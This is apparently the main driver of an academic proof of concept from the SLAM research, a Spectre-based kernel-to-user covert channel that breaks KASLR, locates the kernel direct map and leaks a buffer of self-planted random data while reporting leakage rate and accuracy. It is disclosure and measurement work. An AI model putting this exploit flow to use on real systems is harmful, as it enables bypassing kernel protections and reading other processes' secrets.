/* SLAM's kernel-to-user covert channel using unmasked Spectre gadgets.
 *
 * Date: November 23, 2023
 * Author: Mathé Hertogh - Vrije Universiteit Amsterdam
 */

#include "slam.h"

#define BUF_SIZE (1*MB)
#define AMOUNT (2*KB)
#define MAGIC "@VU5EC"

extern int nr_rewinds;

int main(int argc, char **argv)
{
	set_cpu_affinity(CPU);
	init_rand();
	timer_init();
	evict_init();
	reload_init();

	// Randomly generate ASCII data, to be leaked later.
	char *data = alloc_contiguous_pages(NULL, 0);
	for (int i = 0; i < BUF_SIZE; i++)
		data[i] = rand_printable_ascii_char();
	sprintf(data+BUF_SIZE, MAGIC);

	kaslr_init();
	pr_info("=====[Break KASLR]=====\n");
	uint64_t direct_map = find_direct_map();

	gadget_init(direct_map);

	pr_info("\n=====[Search MAGIC]=====\n");
	uint64_t start = leak_addr(direct_map, direct_map+PHYS_MEM_SIZE, BUF_SIZE, MAGIC);
	if (start == -1)
		fail("did not find MAGIC");

	pr_info("\n=====[Leak the random data]=====\n");
	uint64_t t = clock_read();
	char *secret = leak_data((char *)start, AMOUNT, MAGIC);
	float duration = (clock_read() - t) / 1000000000.0;
	pr_result("Leakage rate: %f B/s\n", AMOUNT / duration);

	int correct = 0;
	for (int i = 0; i < AMOUNT; i++)
		correct += data[BUF_SIZE-AMOUNT+i] == secret[i];
	pr_result("Accuracy: %d / %d (%f%%)\n", correct, AMOUNT, 100.0*correct/AMOUNT);
	pr_result("Number of rewinds: %d\n", nr_rewinds);

	free(secret);

	return 0;
}

